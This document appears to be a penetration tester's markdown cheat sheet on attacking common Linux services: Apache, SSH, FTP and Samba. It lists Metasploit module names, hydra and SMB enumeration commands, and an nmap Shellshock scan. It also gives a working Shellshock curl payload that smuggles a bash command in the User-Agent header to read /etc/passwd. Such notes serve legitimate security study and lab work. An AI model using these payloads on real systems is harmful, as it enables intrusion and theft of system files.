# Frequently Exploited Linux Services

| Protocol/Service             | Ports                                    | Purpose                                                                                                                                                                         |
| ---------------------------- | ---------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Apache Web Server            | TCP ports 80/443                         | Free and open source cross-platform web server released under the Apache License 2.0. Apache accounts for over 80% of web servers globally.                                     |
| SSH (Secure Shell)           | TCP ports 22                             | SSH is a cryptographic remote access protocol that is used to remotely access and control systems over an unsecured network. SSH was developed as a secure successor to telnet. |
| FTP (File Transfer Protocol) | TCP port 21 FTP (File Transfer Protocol) | is a protocol that uses TCP port 21 and is used to facilitate file sharing between a server and client/clients and vice versa.                                                  |
| SAMBA                        | TCP port 445                             | Samba is the Linux implementation of SMB, and allows Windows systems to access Linux shares and devices.                                                                        |


# FTP (T:21)

```bash
hydra ...
```
## $ msf
[[Metasploit#FTP]]


# SSH (T:22)

```bash
hydra ...
```

```bash
auxiliary/scanner/ssh/ssh_version
```

# Apache Web Server (T:80/443)

## Shellshock

```bash
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
http://localhost:8080/cgi-bin/vulnerable
```

## $ nmap>Shellshock

payload przemycany najczęściej w nagłówku `User-Agent`

```bash
$ nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin[,cmd=ls] <target>
```

## $ msf>Shellshock

```bash
exploit/multi/http/apache_mod_cgi_bash_env_exec
```

# SAMBA (T:445)
```bash
enum4linux ...
smbmap ...
smbclient ...
```
```bash
exploit/linux/samba/is_known_pipename
```